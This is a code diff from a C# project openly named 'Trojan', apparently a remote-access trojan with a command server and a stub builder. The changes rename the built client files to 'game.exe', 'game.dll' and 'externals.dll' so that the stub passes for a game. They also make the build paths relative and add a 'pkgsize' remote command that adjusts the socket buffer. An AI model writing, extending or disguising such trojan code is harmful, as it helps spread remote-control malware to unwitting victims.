@@ -3,6 +3,7 @@ using System.Text;
 using System.Runtime.InteropServices;
 using System.Globalization;
 using Trojan.server;
+using Trojan.exceptions;
 using SocketData;
 
 namespace Trojan
@@ -59,14 +60,30 @@ namespace Trojan
         {
             string[] accepted_files = new string[4]
             {
-                "client.dll",
-                "client.exe",
-                "client.runtimeconfig.json",
-                "Trojan.dll"
+                "game.dll",
+                "game.exe",
+                "game.runtimeconfig.json",
+                "externals.dll"
             };
 
-            string TrojanStubLocation = @"C:\Users\kaspe\source\repos\Trojan\client\bin\Debug\net6.0";
-            string new_TrojanStubLocation = @"C:\Users\kaspe\source\repos\Trojan\stub";
+            DirectoryInfo? DirectoryParent = Directory.GetParent(Environment.CurrentDirectory);
+            if(DirectoryParent != null)
+                Environment.CurrentDirectory = DirectoryParent.FullName.Replace("\\bin\\Debug", "");
+
+            string Environment_cfg_file_path = Environment.CurrentDirectory + @"\environment_config.cfg";
+
+            if (Environment.CurrentDirectory == null) throw new ExceptionHandler("Trojan failed to set current working directory : " + nameof(Environment.CurrentDirectory));
+
+            if (File.Exists(Environment_cfg_file_path))
+                File.Delete(Environment_cfg_file_path);
+
+            using (StreamWriter new_EnvironmentConfigFile = new StreamWriter(Environment_cfg_file_path))
+            {
+                new_EnvironmentConfigFile.WriteLine("BasePath = " + Environment.CurrentDirectory);
+            }
+
+            string TrojanStubLocation = Environment.CurrentDirectory + @"\client\bin\Debug\net6.0";
+            string new_TrojanStubLocation = Environment.CurrentDirectory + @"\stub"; 
 
             if (Directory.Exists(new_TrojanStubLocation) && Directory.GetFiles(TrojanStubLocation).Length > 0)
             {
@@ -82,21 +99,23 @@ namespace Trojan
 
             string[] NewPathSplit;
             string NewPath;
+            string new_full_path;
             foreach (string NewFilePath in BuildFiles)
             {
                 NewPathSplit = NewFilePath.Split("\\");
                 NewPath = NewPathSplit[NewPathSplit.Length - 1];
                 for(int i = 0; i < accepted_files.Length; i++)
                 {
+                    new_full_path = new_TrojanStubLocation + "\\";
                     if (NewPath == accepted_files[i])
                     {
-                        File.Move(NewFilePath, new_TrojanStubLocation + "\\" + NewPath);
+                        File.Move(NewFilePath, new_full_path + accepted_files[i]);
                     }
                 }
             }
         }
 
-        public static string gather()
+        public static string gather(string[] command_args)
         {
             StringBuilder CommandOutput = new StringBuilder();
 
@@ -114,6 +133,21 @@ namespace Trojan
             return(CommandOutput.ToString());
         }
 
+        public static string pkgsize(socketSetup Connector, string[] command_args)
+        {
+            if (Connector.sock == null)
+                return("");
+
+            StringBuilder CommandOutput = new StringBuilder();
+
+            int new_pkgsize = int.Parse(command_args[2]);
+            Connector.sock.ReceiveBufferSize = new_pkgsize;
+
+            CommandOutput.AppendLine("\n\n\t[+] pkgsize command completed successfully!\n\n");
+
+            return(CommandOutput.ToString());
+        }
+
         public Server server = new Server();
 
         /// <summary>
@@ -125,7 +159,7 @@ namespace Trojan
 
             TrojanBaseClass TrojanBase = new TrojanBaseClass();
 
-            TrojanBase.server.Init_Server(SocketHandler.PORT, SocketHandler.BUFFSIZE);
+            TrojanBase.server.Init_Server();
 
             while(true)
             {
